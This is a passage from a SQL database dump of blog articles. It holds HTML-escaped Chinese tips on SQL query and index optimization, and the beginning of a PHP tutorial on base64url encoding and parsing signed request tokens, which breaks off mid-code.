style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0.7em;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;line-height:1.6;&quot;&gt;&lt;span style=&quot;line-height:26px;color:#000000;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;这类代码不会返回任何结果集，但是会消耗系统资源的，应改成这样：&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0.7em;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;line-height:1.6;&quot;&gt;&lt;span style=&quot;line-height:26px;color:#000000;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;create table #t(...)&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0.7em;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;line-height:1.6;&quot;&gt;&lt;span style=&quot;line-height:26px;color:#000000;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;13.很多时候用 exists 代替 in 是一个好的选择：&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0.7em;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;line-height:1.6;&quot;&gt;&lt;span style=&quot;line-height:26px;color:#000000;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;select num from a where num in(select num from b)&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0.7em;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;line-height:1.6;&quot;&gt;&lt;span style=&quot;line-height:26px;color:#000000;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;用下面的语句替换：&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0.7em;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;line-height:1.6;&quot;&gt;&lt;span style=&quot;line-height:26px;color:#000000;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;select num from a where exists(select 1 from b where num=a.num)&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0.7em;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;line-height:1.6;&quot;&gt;&lt;span style=&quot;line-height:26px;color:#000000;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;14.并不是所有索引对查询都有效，SQL是根据表中数据来进行查询优化的，当索引列有大量数据重复时，SQL查询可能不会去利用索引，如一表中有字段sex，male、female几乎各一半，那么即使在sex上建了索引也对查询效率起不了作用。&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0.7em;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;line-height:1.6;&quot;&gt;&lt;span style=&quot;line-height:26px;color:#000000;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;15.索引并不是越多越好，索引固然可以提高相应的 select 的效率，但同时也降低了 insert 及 update 的效率，因为 insert 或 update 时有可能会重建索引，所以怎样建索引需要慎重考虑，视具体情况而定。一个表的索引数最好不要超过6个，若太多则应考虑一些不常使用到的列上建的索引是否有必要。&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0.7em;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;line-height:1.6;&quot;&gt;&lt;span style=&quot;line-height:26px;color:#000000;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;16.应尽可能的避免更新 clustered 索引数据列，因为 clustered 索引数据列的顺序就是表记录的物理存储顺序，一旦该列值改变将导致整个表记录的顺序的调整，会耗费相当大的资源。若应用系统需要频繁更新 clustered 索引数据列，那么需要考虑是否应将该索引建为 clustered 索引。&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0.7em;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;line-height:1.6;&quot;&gt;&lt;span style=&quot;line-height:26px;color:#000000;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;17.尽量使用数字型字段，若只含数值信息的字段尽量不要设计为字符型，这会降低查询和连接的性能，并会增加存储开销。这是因为引擎在处理查询和连接时会逐个比较字符串中每一个字符，而对于数字型而言只需要比较一次就够了。&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0.7em;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;line-height:1.6;&quot;&gt;&lt;span style=&quot;line-height:26px;color:#000000;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;18.尽可能的使用 varchar/nvarchar 代替 char/nchar ，因为首先变长字段存储空间小，可以节省存储空间，其次对于查询来说，在一个相对较小的字段内搜索效率显然要高些。&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0.7em;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;line-height:1.6;&quot;&gt;&lt;span style=&quot;line-height:26px;color:#000000;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;19.任何地方都不要使用 select * from t ，用具体的字段列表代替“*”，不要返回用不到的任何字段。&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0.7em;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;line-height:1.6;&quot;&gt;&lt;span style=&quot;line-height:26px;color:#000000;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;20.尽量使用表变量来代替临时表。如果表变量包含大量数据，请注意索引非常有限（只有主键索引）。&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0.7em;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;line-height:1.6;&quot;&gt;&lt;span style=&quot;line-height:26px;color:#000000;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;21.避免频繁创建和删除临时表，以减少系统表资源的消耗。&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0.7em;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;line-height:1.6;&quot;&gt;&lt;span style=&quot;line-height:26px;color:#000000;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;22.临时表并不是不可使用，适当地使用它们可以使某些例程更有效，例如，当需要重复引用大型表或常用表中的某个数据集时。但是，对于一次性事件，最好使用导出表。&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0.7em;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;line-height:1.6;&quot;&gt;&lt;span style=&quot;line-height:26px;color:#000000;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;23.在新建临时表时，如果一次性插入数据量很大，那么可以使用 select into 代替 create table，避免造成大量 log ，以提高速度；如果数据量不大，为了缓和系统表的资源，应先create table，然后insert。&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0.7em;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;line-height:1.6;&quot;&gt;&lt;span style=&quot;line-height:26px;color:#000000;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;24.如果使用到了临时表，在存储过程的最后务必将所有的临时表显式删除，先 truncate table ，然后 drop table ，这样可以避免系统表的较长时间锁定。&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0.7em;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;line-height:1.6;&quot;&gt;&lt;span style=&quot;line-height:26px;color:#000000;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;25.尽量避免使用游标，因为游标的效率较差，如果游标操作的数据超过1万行，那么就应该考虑改写。&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0.7em;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;line-height:1.6;&quot;&gt;&lt;span style=&quot;line-height:26px;color:#000000;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;26.使用基于游标的方法或临时表方法之前，应先寻找基于集的解决方案来解决问题，基于集的方法通常更有效。&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0.7em;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;line-height:1.6;&quot;&gt;&lt;span style=&quot;line-height:26px;color:#000000;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;27.与临时表一样，游标并不是不可使用。对小型数据集使用 FAST_FORWARD 游标通常要优于其他逐行处理方法，尤其是在必须引用几个表才能获得所需的数据时。在结果集中包括“合计”的例程通常要比使用游标执行的速度快。如果开发时间允许，基于游标的方法和基于集的方法都可以尝试一下，看哪一种方法的效果更好。&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0.7em;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;line-height:1.6;&quot;&gt;&lt;span style=&quot;line-height:26px;color:#000000;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;28.在所有的存储过程和触发器的开始处设置 SET NOCOUNT ON ，在结束时设置 SET NOCOUNT OFF 。无需在执行存储过程和触发器的每个语句后向客户端发送 DONE_IN_PROC 消息。&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0.7em;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;line-height:1.6;&quot;&gt;&lt;span style=&quot;line-height:26px;color:#000000;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;29.尽量避免大事务操作，提高系统并发能力。&lt;/span&gt;&lt;/p&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0.7em;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;line-height:1.6;&quot;&gt;&lt;span style=&quot;line-height:26px;color:#000000;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;&quot;&gt;30.尽量避免向客户端返回大数据量，若数据量过大，应该考虑相应需求是否合理。&lt;/span&gt;&lt;/p&gt;\r\n&lt;/div&gt;\r\n&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;/tbody&gt;\r\n&lt;/table&gt;\r\n&lt;/div&gt;\r\n&lt;/div&gt;\r\n&lt;/td&gt;\r\n&lt;/tr&gt;\r\n&lt;/tbody&gt;\r\n&lt;/table&gt;\r\n&lt;p style=&quot;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:0px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:0px;&quot;&gt;&lt;/p&gt;\r\n&lt;/div&gt;\r\n&lt;div class=&quot;blog_nav&quot; style=&quot;right:20px;margin-bottom:15px;&quot;&gt;&lt;div class=&quot;pre_next&quot; style=&quot;float:right;text-align:right;padding-top:5px;&quot;&gt;&lt;a href=&quot;http://m-oyzm.iteye.com/blog/968157&quot; class=&quot;next&quot; title=&quot;Mysql常用命令 &quot; style=&quot;color:#108ac6;text-decoration:underline;padding-top:0px;padding-right:15px;padding-bottom:0px;padding-left:15px;background-image:url(http://www.iteye.com/images/gray_west_arrow.gif);background-position:0% 50%;background-repeat:no-repeat no-repeat;&quot;&gt;Mysql常用&lt;/a&gt;&lt;/div&gt;\r\n&lt;/div&gt;\r\n&lt;/span&gt;', 1, 1, 0, 0, 1302428180, 1, 'admin');
INSERT INTO `cp_article` (`id`, `cat_id`, `title`, `keywords`, `description`, `content`, `views`, `status`, `top`, `recommend`, `create_time`, `create_uid`, `create_username`) VALUES
(42, 1, 'php数据令牌的传递的生成、验证和解析-php框架', '', '', '&lt;span class=&quot;Apple-style-span&quot; style=&quot;font-family:monaco, ''dejavu sans mono'', ''bitstream vera sans mono'', consolas, ''courier new'', monospace;&quot;&gt;&lt;ol start=&quot;1&quot; class=&quot;dp-c&quot; style=&quot;font-size:1em;line-height:1.4em;margin-top:0px;margin-right:0px;margin-bottom:1px;margin-left:0px;padding-top:2px;padding-right:0px;padding-bottom:2px;padding-left:0px;border-top-width:1px;border-right-width:1px;border-bottom-width:1px;border-left-width:1px;border-top-style:solid;border-right-style:solid;border-bottom-style:solid;border-left-style:solid;border-top-color:#d1d7dc;border-right-color:#d1d7dc;border-bottom-color:#d1d7dc;border-left-color:#d1d7dc;list-style-type:decimal;list-style-position:initial;list-style-image:initial;background-color:#ffffff;color:#2b91af;&quot;&gt;&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;lt;?php&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&lt;span class=&quot;keyword&quot; style=&quot;color:#7f0055;font-weight:bold;&quot;&gt;function&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;base64UrlDecode(&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$input&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;)&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;{&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;keyword&quot; style=&quot;color:#7f0055;font-weight:bold;&quot;&gt;return&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;func&quot; style=&quot;color:black;&quot;&gt;base64_decode&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;func&quot; style=&quot;color:black;&quot;&gt;strtr&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$input&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;,&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;string&quot; style=&quot;color:blue;&quot;&gt;''-_''&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;,&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;string&quot; style=&quot;color:blue;&quot;&gt;''+/''&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;));&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;}&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&lt;span class=&quot;keyword&quot; style=&quot;color:#7f0055;font-weight:bold;&quot;&gt;function&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;base64UrlEncode(&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$input&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;)&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;{&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;keyword&quot; style=&quot;color:#7f0055;font-weight:bold;&quot;&gt;return&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;func&quot; style=&quot;color:black;&quot;&gt;base64_encode&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;func&quot; style=&quot;color:black;&quot;&gt;strtr&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$input&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;,&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;string&quot; style=&quot;color:blue;&quot;&gt;''+/''&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;,&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;string&quot; style=&quot;color:blue;&quot;&gt;''-_''&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;));&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;}&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&lt;span class=&quot;comment&quot; style=&quot;color:#008200;&quot;&gt;//&amp;nbsp;生成令牌&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&lt;span class=&quot;keyword&quot; style=&quot;color:#7f0055;font-weight:bold;&quot;&gt;function&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;parseSignedRequest(&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$signed_request&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;,&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$secret&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;string&quot; style=&quot;color:blue;&quot;&gt;''4f5fcdc6514f7ee25ec4fa7c7853e8e1''&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;)&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;{&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;list(&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$encoded_sig&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;,&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$payload&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;)&amp;nbsp;=&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;func&quot; style=&quot;color:black;&quot;&gt;explode&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;string&quot; style=&quot;color:blue;&quot;&gt;''.''&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;,&amp;nbsp;&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$signed_request&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;,&amp;nbsp;2);&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;comment&quot; style=&quot;color:#008200;&quot;&gt;//&amp;nbsp;decode&amp;nbsp;the&amp;nbsp;data&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$sig&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;=&amp;nbsp;base64UrlDecode(&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$encoded_sig&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;);&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$data&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;&amp;nbsp;=&amp;nbsp;json_decode(base64UrlDecode(&lt;/span&gt;&lt;span class=&quot;vars&quot; style=&quot;color:black;&quot;&gt;$payload&lt;/span&gt;&lt;span style=&quot;color:black;&quot;&gt;),&amp;nbsp;true);&amp;nbsp;&amp;nbsp;&lt;/span&gt;&lt;/span&gt;&lt;/li&gt;\r\n&lt;li style=&quot;font-size:1em;margin-top:0px;margin-right:0px;margin-bottom:0px;margin-left:38px;padding-top:0px;padding-right:0px;padding-bottom:0px;padding-left:10px;border-left-width:1px;border-left-style:solid;border-left-color:#d1d7dc;background-color:#fafafa;line-height:18px;&quot;&gt;&lt;span 